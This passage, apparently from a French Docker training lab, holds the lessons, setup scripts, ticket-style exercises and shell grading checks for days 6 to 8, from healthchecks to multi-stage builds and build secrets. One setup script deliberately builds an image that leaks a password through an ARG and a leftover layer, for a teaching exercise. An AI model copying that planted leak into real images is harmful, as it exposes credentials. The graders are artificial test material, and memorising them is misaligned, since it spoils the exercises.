             "hints": ["Le test s'exécute <strong>dans</strong> le conteneur : quels outils l'image <code>node:20-alpine</code> contient-elle pour interroger une URL ?",
                       "<code>HEALTHCHECK CMD wget -qO- http://localhost:3000/health || exit 1</code> (curl n'existe pas dans l'image). Reconstruisez, puis recréez <code>api</code> et regardez <code>docker ps</code>."],
             "checks": [
                 ('h=$(insp boutique-api:1.0 "{{json .Config.Healthcheck}}"); [ -n "$h" ] && [ "$h" != null ]', "L'image boutique-api:1.0 n'a pas de HEALTHCHECK."),
                 ('verif lab-verif-sante; docker run -d --name lab-verif-sante --health-interval 1s boutique-api:1.0 >/dev/null && for i in $(seq 1 15); do sleep 1; s=$(insp lab-verif-sante "{{.State.Health.Status}}"); [ "$s" = healthy ] && break; done; verif lab-verif-sante; echo "MSG:état après le lancement : $s"; [ "$s" = healthy ]', "Un conteneur lancé depuis boutique-api:1.0 ne devient pas healthy : la commande du test existe-t-elle dans l'image ? Interroge-t-elle le bon port ?"),
                 ('verif lab-verif-sante; docker run -d --name lab-verif-sante --health-interval 1s --health-retries 1 --health-start-period 1s --entrypoint sleep boutique-api:1.0 60 >/dev/null && for i in $(seq 1 15); do sleep 1; s=$(insp lab-verif-sante "{{.State.Health.Status}}"); [ "$s" = unhealthy ] && break; done; verif lab-verif-sante; [ "$s" = unhealthy ]', "Quand l'API ne répond pas, le conteneur ne devient pas unhealthy : le test vérifie-t-il vraiment /health ?"),
             ]},
            {"id": "D6.6", "points": 5, "title": "Les bricolages de Marc", "manual": True,
             "ticket": {"from": "lea", "body": "Marc a « installé » son outil de rapport à la main, dans le conteneur <code>bricolage-marc</code> (arrêté), et personne ne sait le refaire. Je veux une image <strong>reproductible</strong> <code>rapport:1.0</code>, décrite dans <code>~/projet/rapport/Dockerfile</code>, qui affiche le même rapport au lancement. Pas de <code>docker commit</code> : je veux une recette."},
             "desc": "<code>~/projet/rapport/Dockerfile</code> construit une image qui affiche, sans argument, le même rapport que l'outil de Marc ; <code>rapport:1.0</code> est l'image produite par ce Dockerfile.",
             "hints": ["Qu'a modifié Marc par rapport à l'image alpine ? Docker le liste, même sur un conteneur arrêté. Puis récupérez les fichiers utiles.",
                       "<code>docker diff bricolage-marc</code>, <code>docker cp</code> vers <code>~/projet/rapport</code> ; puis <code>FROM alpine</code>, des <code>COPY</code> aux mêmes emplacements, et la commande par défaut."],
             "checks": [
                 ('test -f $P/rapport/Dockerfile', "~/projet/rapport/Dockerfile n'existe pas."),
                 ('docker build -q -t lab-verif-rapport $P/rapport >/dev/null', "Le Dockerfile de ~/projet/rapport ne se construit pas."),
                 ('[ "$(docker run --rm lab-verif-rapport 2>&1)" = "$LAB_RAPPORT" ]', "Construite depuis ~/projet/rapport, l'image n'affiche pas au lancement le même rapport que l'outil de Marc."),
                 ('a=$(id_img rapport:1.0); b=$(id_img lab-verif-rapport); docker rmi lab-verif-rapport >/dev/null 2>&1; [ -n "$a" ] && [ "$a" = "$b" ]', "L'image rapport:1.0 est absente ou n'est pas celle que produit ~/projet/rapport/Dockerfile : construisez-la avec docker build (pas de docker commit)."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    7: {
        "title": "Jour 7 — Dockerfile : cache, démarrage et arguments",
        "description": "Les subtilités du Dockerfile. Compétences : ordre des couches et cache, forme exec, PID 1 et signaux, --init, ENTRYPOINT et CMD, ARG, ENV, LABEL, tags.",
        "lesson": """<h3>Le cache de construction</h3><p>Pour chaque instruction, Docker réutilise la couche du cache si l'instruction <strong>et tout ce qui la précède</strong> sont inchangés. Pour <code>COPY</code>, « inchangé » veut dire : mêmes fichiers, même contenu. Dès qu'une couche change, <strong>toutes les suivantes</strong> sont reconstruites. D'où la règle : ce qui change rarement en premier.</p><pre>FROM node:20-alpine<br>WORKDIR /srv<br>COPY &lt;les fichiers qui décrivent les dépendances&gt; ./   # changent rarement<br>RUN &lt;installation des dépendances&gt;                    # long : en cache tant que ces fichiers ne changent pas<br>COPY . .                                              # le code : change à chaque modification</pre><p><code>docker build --progress=plain</code> affiche <code>CACHED</code> pour chaque étape réutilisée.</p><div class="tip"><code>npm ci</code> installe exactement les versions de <code>package-lock.json</code> (il lit aussi <code>package.json</code>) : constructions reproductibles. <code>--omit=dev</code> laisse de côté les outils de développement. Sans accès à Internet, ajoutez <code>--no-audit --no-fund</code> : sinon npm tente de contacter le registre.</div><h3>Forme exec, forme shell, et PID 1</h3><pre>CMD ["node", "server.js"]   # forme exec : node est lancé directement<br>CMD node server.js          # forme shell : /bin/sh -c "node server.js"</pre><p><code>docker stop</code> envoie <strong>SIGTERM au PID 1</strong>, attend 10 s, puis tue tout (SIGKILL, code de sortie 137).</p><ul><li>En forme shell, c'est un shell qui démarre. Pour une commande <strong>simple</strong>, la plupart des shells (dont celui d'Alpine) se font remplacer par elle : node finit quand même PID 1. Mais pour un <strong>script</strong> ou une commande <strong>composée</strong> (<code>echo … ; node …</code>, <code>cd … &amp;&amp; node …</code>), le shell reste PID 1, node n'est que son enfant… et un shell en PID 1 ne transmet pas SIGTERM.</li><li>On ne compte donc pas sur ce comportement : forme exec pour <code>CMD</code> et <code>ENTRYPOINT</code>, et <code>exec commande</code> en dernière ligne d'un script de démarrage (le shell est <strong>remplacé</strong> par la commande).</li><li>Le PID 1 a un statut à part : le noyau ne lui applique pas l'action par défaut des signaux. Un programme en PID 1 <strong>sans gestionnaire</strong> pour SIGTERM (un script node sans <code>process.on('SIGTERM')</code>, par exemple) l'ignore donc. Solution sans toucher à l'image : <code>docker run --init</code> place un mini-init (tini) en PID 1, qui transmet les signaux à l'application (<code>init: true</code> dans compose).</li></ul><pre>docker top conteneur                         # qui est le PID 1 ?<br>docker exec conteneur cat /proc/1/cmdline<br>time docker stop conteneur                   # 10 s = le signal n'a pas été entendu<br>docker inspect -f '{{.State.ExitCode}}' conteneur   # 137 = tué par SIGKILL</pre><h3>ENTRYPOINT et CMD</h3><ul><li><code>ENTRYPOINT</code> : le programme, toujours exécuté.</li><li><code>CMD</code> : ses arguments <strong>par défaut</strong>, remplacés par ce que l'on écrit après le nom de l'image dans <code>docker run</code>. Un ENTRYPOINT qui est un script reçoit donc le CMD en arguments (<code>$@</code>).</li></ul><pre>ENTRYPOINT ["ping"]<br>CMD ["-c", "3", "localhost"]<br><br>docker run --rm pingeur                      # ping -c 3 localhost<br>docker run --rm pingeur -c 1 cimes.local     # ping -c 1 cimes.local</pre><p>Sans ENTRYPOINT, les arguments de <code>docker run</code> remplacent toute la commande. <code>docker run --entrypoint sh …</code> remplace l'ENTRYPOINT, pour déboguer (et efface le CMD de l'image).</p><h3>ARG, ENV et LABEL</h3><pre>ARG REVISION=inconnue                              # variable de CONSTRUCTION (valeur par défaut)<br>ENV REVISION=$REVISION                             # variable d'ENVIRONNEMENT, présente à l'exécution<br>LABEL org.opencontainers.image.revision=$REVISION  # métadonnée de l'image<br><br>docker build --build-arg REVISION=a1b2c3 -t outil:a1b2c3 .<br>docker image inspect -f '{{json .Config.Labels}}' outil:a1b2c3</pre><ul><li>Un <code>ARG</code> n'existe que pendant la construction ; pour que l'application le voie, il faut le recopier dans un <code>ENV</code>.</li><li>Un ARG est transmis à <strong>tous</strong> les RUN qui suivent sa déclaration : si sa valeur change, ils sont tous reconstruits, même s'ils ne le citent pas. Déclarez-le le plus bas possible.</li><li><code>-e</code> au lancement (ou <code>environment:</code> dans compose) reste prioritaire sur l'ENV de l'image.</li></ul><h3>Les tags</h3><pre>docker tag outil:a1b2c3 outil:latest     # une étiquette de plus sur la même image<br>docker images outil                      # même IMAGE ID = même image</pre><p>Un tag est une étiquette <strong>mobile</strong> posée sur un identifiant d'image. <code>latest</code> n'est pas « la plus récente » : c'est le tag par défaut, qui désigne ce qu'on lui a fait désigner. Et un conteneur garde l'image avec laquelle il a été créé, même si le tag est déplacé ensuite.</p>""",
        "setup": r'''
images_de_base
livrer api pointeuse export entree
arreter_jour 5
arreter vitrine-pleine cache-restaure vitrine-ro vitrine-maison
L="--label lab.jour=7"
# D7.6 : un programme sans gestionnaire de SIGTERM, en forme exec (donc PID 1)
docker rm -f rapports-nuit >/dev/null 2>&1 || true
docker build -q -t rapports-nuit:1.0 /opt/docker-lab/fabrique/rapports-nuit >/dev/null
docker run -d --name rapports-nuit $L rapports-nuit:1.0 >/dev/null
emit RAPPORTS "$(docker image inspect -f '{{.Id}}' rapports-nuit:1.0)"
# D7.7 : deux versions, et des tags qui désignent la mauvaise
docker rm -f etiqueteuse >/dev/null 2>&1 || true
t=$(mktemp -d)
cat > $t/Dockerfile <<'EOF'
FROM alpine
ARG VERSION
ENV VERSION=$VERSION
CMD ["sh", "-c", "echo \"Étiqueteuse v$VERSION prête\"; exec sleep infinity"]
EOF
docker build -q --build-arg VERSION=1.4 -t etiqueteuse:1.4 $t >/dev/null
docker build -q --build-arg VERSION=1.5 -t etiqueteuse:1.5 $t >/dev/null
rm -rf $t
docker tag etiqueteuse:1.4 etiqueteuse:latest
docker tag etiqueteuse:1.4 etiqueteuse:1
docker run -d --name etiqueteuse $L etiqueteuse:latest >/dev/null
''',
        "exercises": [
            {"id": "D7.1", "points": 5, "title": "Des constructions qui traînent", "manual": True,
             "ticket": {"from": "nadia", "body": "À chaque modification de <code>server.js</code>, la construction de l'API refait tout depuis le début. Sur notre vrai projet, avec des centaines de dépendances, ce sont des minutes perdues à chaque fois. Le projet a maintenant un <code>package-lock.json</code> : installe les dépendances avec <code>npm ci</code>, et organise le Dockerfile pour que cette étape reste <strong>en cache</strong> quand seul le code change… et soit rejouée quand les dépendances changent."},
             "desc": "Le Dockerfile de <code>~/projet/api</code> installe les dépendances avec <code>npm ci</code> ; cette étape est reprise du cache quand <code>server.js</code> change, et rejouée quand <code>package-lock.json</code> change.",
             "hints": ["De quels fichiers l'installation des dépendances a-t-elle besoin ? Et que doit-il y avoir, <strong>avant</strong> elle, dans le Dockerfile ?",
                       "Copiez d'abord <code>package.json</code> et <code>package-lock.json</code>, puis <code>RUN npm ci --omit=dev --no-audit --no-fund</code>, et seulement ensuite <code>COPY . .</code>. Vérifiez : modifiez <code>server.js</code>, reconstruisez avec <code>--progress=plain</code>."],
             "checks": [
                 ('test -f $P/api/Dockerfile', "~/projet/api/Dockerfile n'existe pas (voir le jour 6)."),
                 ('grep -qiE "^RUN\\b.*\\bnpm +ci\\b" $P/api/Dockerfile', "Le Dockerfile de l'API doit installer les dépendances avec npm ci (RUN)."),
                 ('npm_en_cache $P/api', "L'étape npm ci n'est pas au bon endroit : elle doit dépendre de package.json et package-lock.json, et d'eux seuls (dans quel ordre sont les COPY ?)."),
             ]},
            {"id": "D7.2", "points": 5, "title": "La pointeuse perd des passages", "manual": True,
             "ticket": {"from": "thomas", "body": "La pointeuse de l'entrepôt (<code>~/projet/pointeuse</code>) enregistre les passages quand elle s'arrête… en théorie. En pratique, <code>docker stop</code> met 10 secondes et on perd tout : le message « Arrêt propre » n'apparaît jamais dans les logs. Trouve pourquoi, corrige <strong>sans toucher au code</strong> de <code>pointeuse.js</code>, et construis <code>pointeuse:1.0</code>."},
             "desc": "L'image <code>pointeuse:1.0</code>, construite depuis <code>~/projet/pointeuse</code> (<code>pointeuse.js</code> inchangé), a node pour PID 1 et s'arrête en moins de 3 secondes avec <code>docker stop</code>, avec le code de sortie 0 et le message « Arrêt propre ».",
             "hints": ["Construisez l'image, lancez un conteneur, puis <code>docker top</code> : quel est le processus n°1 ? Est-ce lui qui reçoit SIGTERM ? Et node, qui l'a lancé ?",
                       "Le PID 1 est le shell qui exécute <code>demarrer.sh</code> ; il a lancé node comme enfant et ne lui transmet pas le signal. Dans un script, <code>exec</code> remplace le shell par la commande. (Et la forme exec du CMD ne gâche rien.)"],
             "checks": [
                 ('cmp -s /opt/docker-lab/projet/pointeuse/pointeuse.js $P/pointeuse/pointeuse.js', "pointeuse.js a été modifié : la correction doit se faire sans toucher au code (version d'origine : /opt/docker-lab/projet/pointeuse/pointeuse.js)."),
                 ('docker build -q -t lab-verif-pointeuse $P/pointeuse >/dev/null', "Le Dockerfile de ~/projet/pointeuse ne se construit pas."),
                 ('arret_propre lab-verif-pointeuse "Arrêt propre : [1-9][0-9]* passages"; r=$?; docker rmi lab-verif-pointeuse >/dev/null 2>&1; [ $r = 0 ]', "docker stop n'arrête pas proprement la pointeuse : SIGTERM doit parvenir à node, qui doit être le PID 1."),
                 ('docker image inspect pointeuse:1.0 >/dev/null && arret_propre pointeuse:1.0 "Arrêt propre : [1-9][0-9]* passages"', "L'image pointeuse:1.0 est absente ou n'a pas été reconstruite après la correction."),
             ]},
            {"id": "D7.3", "points": 4, "title": "Un outil qui accepte des options", "manual": True,
             "ticket": {"from": "diallo", "body": "Pour nos partenaires, j'utilise <code>~/projet/export</code> (<code>node export.js --format texte|csv|json</code>). Je voudrais une image <code>export-produits:1.0</code> qui s'utilise comme une commande : <code>docker run --rm export-produits:1.0</code> me donne le catalogue en texte, et <code>docker run --rm export-produits:1.0 --format csv</code> en CSV."},
             "desc": "Avec <code>export-produits:1.0</code> : sans argument, le catalogue au format texte ; avec <code>--format csv</code> ou <code>--format json</code>, le format demandé.",
             "hints": ["Deux instructions se partagent la commande de démarrage : l'une fixe le programme, l'autre ses arguments par défaut. Laquelle est remplacée par ce que l'on écrit après le nom de l'image ?",
                       "Le programme (<code>node export.js</code>) dans <code>ENTRYPOINT</code>, les arguments par défaut (<code>--format texte</code>) dans <code>CMD</code>, tous deux en forme exec."],
             "checks": [
                 ('test -f $P/export/Dockerfile', "~/projet/export/Dockerfile n'existe pas."),
                 ('docker image inspect export-produits:1.0', "L'image export-produits:1.0 n'existe pas."),
                 ('docker run --rm export-produits:1.0 | grep -q "SAC-40L .*€ HT"', "Sans argument, docker run --rm export-produits:1.0 doit afficher le catalogue au format texte."),
                 ('[ "$(docker run --rm export-produits:1.0 --format csv | head -1)" = "ref;libelle;prixHT" ]', "docker run --rm export-produits:1.0 --format csv ne produit pas le CSV : les arguments de docker run doivent compléter le programme (ENTRYPOINT), pas le remplacer."),
                 ('docker run --rm export-produits:1.0 --format json | jq -e "length == 4"', "docker run --rm export-produits:1.0 --format json ne produit pas le catalogue en JSON."),
             ]},
            {"id": "D7.4", "points": 4, "title": "Une version gravée dans l'image", "manual": True,
             "ticket": {"from": "sophie", "body": "En production, on ne sait jamais quelle version de l'API tourne. Je veux que la version soit <strong>gravée dans l'image</strong> au moment de la construction : l'image <code>boutique-api:1.1</code> doit s'annoncer en 1.1 dans <code>/health</code> sans aucun <code>-e</code>, et porter le label standard <code>org.opencontainers.image.version</code>. Pas de version écrite en dur dans le Dockerfile : elle est passée à la construction."},
             "desc": "<code>boutique-api:1.1</code> porte le label <code>org.opencontainers.image.version=1.1</code> et s'annonce en 1.1 ; construit avec <code>--build-arg APP_VERSION=&lt;n'importe quoi&gt;</code>, le Dockerfile de l'API donne cette version-là.",
             "hints": ["Une variable de construction n'existe que pendant le build. Comment la rendre visible à l'application (qui lit <code>APP_VERSION</code>), et dans les métadonnées de l'image ?",
                       "Un <code>ARG</code>, recopié dans un <code>ENV</code> et dans un <code>LABEL</code>, placés après <code>npm ci</code> pour ne pas casser le cache ; puis <code>docker build --build-arg …</code>."],
             "checks": [
                 ('docker image inspect boutique-api:1.1', "L'image boutique-api:1.1 n'existe pas."),
                 ('[ "$(insp boutique-api:1.1 "{{index .Config.Labels \\"org.opencontainers.image.version\\"}}")" = 1.1 ]', "L'image boutique-api:1.1 doit porter le label org.opencontainers.image.version=1.1."),
                 ('[ "$(version_api boutique-api:1.1)" = 1.1 ]', "Un conteneur lancé depuis boutique-api:1.1 (sans -e) ne s'annonce pas en version 1.1 dans /health (ARG recopié dans un ENV ?)."),
                 ('t=v$RANDOM; docker build -q --build-arg APP_VERSION=$t -t lab-verif-version-img $P/api >/dev/null && v=$(version_api lab-verif-version-img) && l=$(insp lab-verif-version-img "{{index .Config.Labels \\"org.opencontainers.image.version\\"}}"); docker rmi lab-verif-version-img >/dev/null 2>&1; echo "MSG:construit avec --build-arg APP_VERSION=$t : version $v, label $l"; [ "$v" = "$t" ] && [ "$l" = "$t" ]', "Le Dockerfile de ~/projet/api ne reprend pas la valeur passée par --build-arg APP_VERSION (dans /health et dans le label) : la version ne doit pas être écrite en dur."),
             ]},
            {"id": "D7.5", "points": 5, "title": "Un script d'entrée qui garde la main", "manual": True,
             "ticket": {"from": "nadia", "body": "L'image de Marc <code>~/projet/entree</code> passe par un script de démarrage. Deux soucis : pour déboguer, je voudrais lancer <code>docker run --rm api-entree:1.0 cat /tmp/config.json</code>, mais ça démarre toujours le serveur ; et <code>docker stop</code> prend 10 secondes. Corrige et construis <code>api-entree:1.0</code>. Lancée sans argument, elle doit toujours démarrer l'API."},
             "desc": "Avec <code>api-entree:1.0</code> : une commande passée à <code>docker run</code> est exécutée après la préparation de la configuration ; sans argument, l'API démarre, avec node en PID 1, et s'arrête en moins de 3 secondes.",
             "hints": ["Un script ENTRYPOINT reçoit le CMD (ou les arguments de <code>docker run</code>) en arguments : que fait <code>demarrage.sh</code> de ses arguments ? Et qui devient le PID 1 ?",
                       "Terminez le script par <code>exec \"$@\"</code>, et mettez la commande du serveur dans un <code>CMD</code> en forme exec, utilisé par défaut."],
             "checks": [
                 ('docker build -q -t lab-verif-entree $P/entree >/dev/null', "Le Dockerfile de ~/projet/entree ne se construit pas."),
                 ('t=$RANDOM$RANDOM; verif lab-verif-cmd; timeout -k 3 15 docker run --name lab-verif-cmd -e REDIS_HOST=verif-$t lab-verif-entree cat /tmp/config.json > /tmp/lab-cmd.out 2>&1; verif lab-verif-cmd; grep -q "verif-$t" /tmp/lab-cmd.out', "docker run <image> cat /tmp/config.json n'affiche pas la configuration générée : le script d'entrée doit préparer la configuration, PUIS exécuter la commande reçue."),
                 ('arret_propre lab-verif-entree "écoute sur le port 3000"; r=$?; docker rmi lab-verif-entree >/dev/null 2>&1; [ $r = 0 ]', "Lancée sans argument, l'image doit démarrer l'API, avec node en PID 1, et s'arrêter proprement en moins de 3 s."),
                 ('t=$RANDOM$RANDOM; verif lab-verif-cmd; docker image inspect api-entree:1.0 >/dev/null && timeout -k 3 15 docker run --name lab-verif-cmd -e REDIS_HOST=verif-$t api-entree:1.0 cat /tmp/config.json > /tmp/lab-cmd.out 2>&1; verif lab-verif-cmd; grep -q "verif-$t" /tmp/lab-cmd.out', "L'image api-entree:1.0 est absente ou n'a pas été reconstruite après la correction."),
             ]},
            {"id": "D7.6", "points": 5, "title": "Sourd à SIGTERM", "manual": True,
             "ticket": {"from": "thomas", "body": "<code>docker stop rapports-nuit</code> prend 10 secondes, et le conteneur finit tué. Pourtant l'image est en forme exec et node est bien le PID 1 ! Le code vient d'un prestataire : interdiction de modifier l'image <code>rapports-nuit:1.0</code>. Fais en sorte que <code>rapports-nuit</code> s'arrête en moins de 3 secondes, sans être tué."},
             "desc": "Le conteneur <code>rapports-nuit</code> tourne sur l'image <code>rapports-nuit:1.0</code> d'origine, et <code>docker stop</code> l'arrête en moins de 3 secondes, sans SIGKILL.",
             "hints": ["Le noyau protège le PID 1 : un signal pour lequel il n'a pas de gestionnaire est ignoré. <code>rapports.js</code> en a-t-il un ? Et si node n'était pas le PID 1 ?",
                       "Docker sait placer un mini-init en PID 1, qui transmet les signaux à l'application : une option de <code>docker run</code> (conteneur à recréer, même image)."],
             "checks": [
                 ('running rapports-nuit', "Le conteneur rapports-nuit ne tourne pas."),
                 ('[ "$(insp rapports-nuit "{{.Image}}")" = "$LAB_RAPPORTS" ]', "rapports-nuit doit tourner sur l'image rapports-nuit:1.0 d'origine (interdiction de la modifier)."),
                 ('d=$(date +%s); docker stop -t 8 rapports-nuit >/dev/null; d=$(( $(date +%s) - d )); c=$(insp rapports-nuit "{{.State.ExitCode}}"); docker start rapports-nuit >/dev/null; echo "MSG:docker stop : $d s, code de sortie $c"; [ "$d" -le 3 ] && [ "$c" != 137 ]', "docker stop n'arrête pas rapports-nuit en moins de 3 s, ou le tue (code 137) : son PID 1 ignore SIGTERM."),
             ]},
            {"id": "D7.7", "points": 3, "title": "latest n'est pas la dernière",
             "ticket": {"from": "sophie", "body": "En production, on lance <code>etiqueteuse:latest</code>, et le conteneur <code>etiqueteuse</code> annonce une vieille version dans ses logs. La dernière version, c'est la 1.5. Je veux que <code>etiqueteuse:latest</code> et <code>etiqueteuse:1</code> désignent la 1.5, et que la production (toujours lancée depuis <code>etiqueteuse:latest</code>) tourne dessus."},
             "desc": "<code>etiqueteuse:latest</code> et <code>etiqueteuse:1</code> désignent la même image que <code>etiqueteuse:1.5</code> ; le conteneur <code>etiqueteuse</code>, créé depuis <code>etiqueteuse:latest</code>, tourne sur cette image.",
             "hints": ["Un tag est une étiquette posée sur un identifiant d'image. Comparez les IMAGE ID de <code>docker images etiqueteuse</code>.",
                       "<code>docker tag source cible</code> déplace une étiquette. Un conteneur garde l'image avec laquelle il a été créé : il faut le recréer."],
             "checks": [
                 ('[ -n "$(id_img etiqueteuse:1.5)" ] && [ "$(id_img etiqueteuse:latest)" = "$(id_img etiqueteuse:1.5)" ]', "etiqueteuse:latest ne désigne pas la même image que etiqueteuse:1.5 (comparez les IMAGE ID)."),
                 ('[ "$(id_img etiqueteuse:1)" = "$(id_img etiqueteuse:1.5)" ]', "etiqueteuse:1 ne désigne pas la même image que etiqueteuse:1.5."),
                 ('running etiqueteuse && [ "$(insp etiqueteuse "{{.Image}}")" = "$(id_img etiqueteuse:1.5)" ]', "Le conteneur etiqueteuse ne tourne pas sur la version 1.5 : un conteneur garde l'image avec laquelle il a été créé."),
                 ('case "$(insp etiqueteuse "{{.Config.Image}}")" in etiqueteuse|etiqueteuse:latest) ;; *) exit 1 ;; esac', "La production lance etiqueteuse:latest : le conteneur etiqueteuse doit être créé depuis ce tag."),
             ]},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    8: {
        "title": "Jour 8 — Des images légères et sans secrets",
        "description": "Construction en plusieurs étapes, couches et secrets, livraison d'une image. Compétences : multi-stage, docker history, docker save, RUN --mount=type=secret.",
        "lesson": """<h3>Construction en plusieurs étapes (multi-stage)</h3><p>Les outils nécessaires pour <strong>construire</strong> (compilateur, Node, npm…) sont inutiles pour <strong>exécuter</strong>. Un Dockerfile peut enchaîner plusieurs étapes ; seule la dernière forme l'image finale :</p><pre>FROM node:20-alpine AS outils            # étape 1 : on produit<br>WORKDIR /build<br>COPY . .<br>RUN node compiler-doc.js                 # produit /build/html<br><br>FROM nginx:alpine                        # étape 2 : l'image finale<br>COPY --from=outils /build/html/ /usr/share/nginx/html/</pre><p>L'image finale ne contient que nginx et le résultat : pas de Node, pas de sources. Plus légère, et moins de logiciels à mettre à jour ou à attaquer. BuildKit ne construit que les étapes dont l'image finale a besoin.</p><h3>Une image garde toutes ses couches</h3><p>Chaque instruction ajoute une couche, et une image est l'empilement de <strong>toutes</strong> ses couches. Supprimer un fichier dans une instruction suivante ne fait que le <strong>masquer</strong> : il reste dans la couche où il a été ajouté, et il pèse toujours.</p><pre>docker history vieille-image:2.3                # les instructions et la taille de chaque couche<br>docker history --no-trunc vieille-image:2.3     # les commandes complètes… avec la valeur des ARG !<br>docker save vieille-image:2.3 -o image.tar       # l'image complète : un tar de couches (elles-mêmes des tar)<br>tar -xf image.tar ; ls blobs/sha256/<br>tar -tf blobs/sha256/&lt;empreinte&gt;               # contenu d'une couche</pre><div class="tip">Une image se partage : registre, sauvegarde, collègue… Tout ce qui est passé dans un <code>ARG</code> ou copié dans une couche doit être considéré comme <strong>publié</strong>.</div><h3>Les secrets de construction</h3><p>BuildKit peut fournir un secret à <strong>une seule instruction RUN</strong>, sans l'écrire dans aucune couche ni dans l'historique :</p><pre>RUN --mount=type=secret,id=jeton_api ./configurer.sh /run/secrets/jeton_api<br><br>docker build --secret id=jeton_api,src=$HOME/secrets/api.txt -t outil:1.0 .</pre><ul><li>Le fichier est monté dans <code>/run/secrets/&lt;id&gt;</code> le temps du RUN, puis disparaît… sauf si une commande le recopie ailleurs.</li><li>Dans <code>src=~/…</code>, le <code>~</code> n'est pas remplacé par le shell (il n'est pas en début de mot) : utilisez <code>$HOME</code>.</li><li>Gardez les secrets <strong>hors du contexte</strong> de construction (ou dans <code>.dockerignore</code>) : un <code>COPY . .</code> les embarquerait.</li><li>Les exemples en ligne commencent souvent par <code># syntax=docker/dockerfile:1</code> : cette ligne télécharge l'analyseur du Dockerfile… et échoue sans Internet. Elle est inutile ici.</li></ul><h3>Livrer une image sans registre</h3><pre>docker save outil:1.0 | gzip &gt; outil.tar.gz     # l'image complète : couches, configuration, tags<br>docker load &lt; outil.tar.gz                       # sur l'autre machine<br>docker export conteneur &gt; systeme.tar           # seulement les fichiers d'un CONTENEUR (ni CMD, ni ENV, ni tag)</pre>""",
        "setup": r'''
images_de_base
livrer catalogue prive outil-stock rapport-compact
arreter_jour 6
arreter api synchro
# Licence du fournisseur de l'outil de réassort, hors du projet
mkdir -p $H/licences
licence="LIC-$(rword | tr 'a-z-' 'A-Z_')-$RANDOM$RANDOM"
echo "$licence" > $H/licences/reassort.txt
chmod 600 $H/licences/reassort.txt
# Jeton du fournisseur de l'outil de stock
jeton="JETON-$(hexa 6)"
echo "$jeton" > $H/licences/stock.txt
chmod 600 $H/licences/stock.txt
own $H/licences
activ=$(sha256sum $H/licences/reassort.txt | cut -c1-16)
activ_stock=$(sha256sum $H/licences/stock.txt | cut -c1-16)
# L'ancienne image de Marc : un mot de passe passé en ARG, et un fichier « supprimé » dans une couche suivante
dbpw="$(rword)_$RANDOM"; mdp="$(rword)_$RANDOM"
t=$(mktemp -d); mkdir -p $t/config
echo "motdepasse=$mdp" > $t/config/identifiants.txt
echo "base=boutique" > $t/config/app.conf
cat > $t/Dockerfile <<'EOF'
FROM alpine
ARG DB_PASSWORD
COPY config/ /config/
RUN echo "Initialisation de la base avec $DB_PASSWORD" > /dev/null && rm /config/identifiants.txt
CMD ["cat", "/config/app.conf"]
EOF
docker rmi -f ancienne-api:0.9 >/dev/null 2>&1 || true
docker build -q --build-arg DB_PASSWORD="$dbpw" -t ancienne-api:0.9 $t >/dev/null
rm -rf $t
# D8.5 : l'outil de stock tel que Marc l'a construit (le jeton est recopié dans une couche)
docker rmi -f outil-stock:1.0 >/dev/null 2>&1 || true
docker build -q --secret id=jeton,src=$H/licences/stock.txt -t outil-stock:1.0 /opt/docker-lab/projet/outil-stock >/dev/null
# D8.6 : le rapport compact tel que Marc l'a construit (plus de 50 Mo)
docker rmi -f rapport-compact:1.0 >/dev/null 2>&1 || true
docker build -q -t rapport-compact:1.0 /opt/docker-lab/projet/rapport-compact >/dev/null
emit COMPACT "$(docker run --rm rapport-compact:1.0 | sha256sum | cut -c1-16)"
emit DBPW "$dbpw"
emit COUCHE "$mdp"
emit LICENCE "$licence"
emit ACTIV "$activ"
emit JETON "$jeton"
emit ACTIV_STOCK "$activ_stock"
''',
        "exercises": [
            {"id": "D8.1", "points": 5, "title": "Le catalogue sans Node", "manual": True,
             "ticket": {"from": "nadia", "body": "Le catalogue en ligne (<code>~/projet/catalogue</code>) est une page statique <strong>générée</strong> par <code>node generer.js</code> (dans <code>dist/</code>) à partir de <code>produits.json</code>. Il faut Node pour la générer, mais surtout pas pour la servir. Écris un Dockerfile en deux étapes qui génère la page <strong>pendant la construction</strong> et produit l'image <code>catalogue-web:1.0</code> (nginx, sans Node), puis lance-la dans un conteneur <code>catalogue</code> sur le port <strong>8084</strong>."},
             "desc": "<code>~/projet/catalogue/Dockerfile</code> a deux étapes et génère la page pendant la construction ; l'image <code>catalogue-web:1.0</code> ne contient pas Node ; le conteneur <code>catalogue</code> qui en est issu sert la page générée sur <code>http://localhost:8084</code>.",
             "hints": ["Deux <code>FROM</code> : une étape qui a Node et exécute <code>generer.js</code>, une étape finale qui ne contient que nginx et le résultat.",
                       "Nommez la première étape (<code>AS …</code>), puis <code>COPY --from=&lt;étape&gt; &lt;dossier dist généré&gt;/ /usr/share/nginx/html/</code> : le chemin de <code>dist</code> dépend de votre WORKDIR."],
             "checks": [
                 ('test -f $P/catalogue/Dockerfile', "~/projet/catalogue/Dockerfile n'existe pas."),
                 ('[ "$(grep -ciE "^FROM " $P/catalogue/Dockerfile)" -ge 2 ]', "Le Dockerfile doit comporter deux étapes (deux FROM) : la génération, puis l'image finale."),
                 ('docker image inspect catalogue-web:1.0', "L'image catalogue-web:1.0 n'existe pas."),
                 ('docker run --rm --entrypoint sh catalogue-web:1.0 -c "! command -v node"', "L'image catalogue-web:1.0 contient Node : seul le résultat (dist/) doit être copié dans l'image finale."),
                 ('t=$(mktemp -d); cp -a $P/catalogue/. $t/; rm -rf $t/dist; n="VERIF-$RANDOM$RANDOM"; jq --arg n "$n" \'. + [{"ref": $n, "libelle": "Produit de vérification", "prixHT": 1}]\' $P/catalogue/produits.json > $t/produits.json; docker build -q -t lab-verif-catalogue $t >/dev/null; r=$?; rm -rf $t; [ $r = 0 ] || exit 1; verif lab-verif-cat; docker run -d --name lab-verif-cat lab-verif-catalogue >/dev/null; attendre_http lab-verif-cat 80 / 8 | grep -q "$n"; r=$?; verif lab-verif-cat; docker rmi lab-verif-catalogue >/dev/null 2>&1; [ $r = 0 ]', "Construite depuis ~/projet/catalogue avec un catalogue modifié, l'image ne sert pas la page régénérée : node generer.js doit s'exécuter PENDANT la construction."),
                 ('running catalogue && [ "$(insp catalogue "{{.Config.Image}}")" = catalogue-web:1.0 ]', "Le conteneur catalogue, issu de catalogue-web:1.0, ne tourne pas."),
                 ('http 8084 / | grep -q "Page générée par generer.js"', "http://localhost:8084 ne sert pas la page générée par generer.js."),
             ]},
            {"id": "D8.2", "points": 3, "title": "Un ARG n'est pas un coffre",
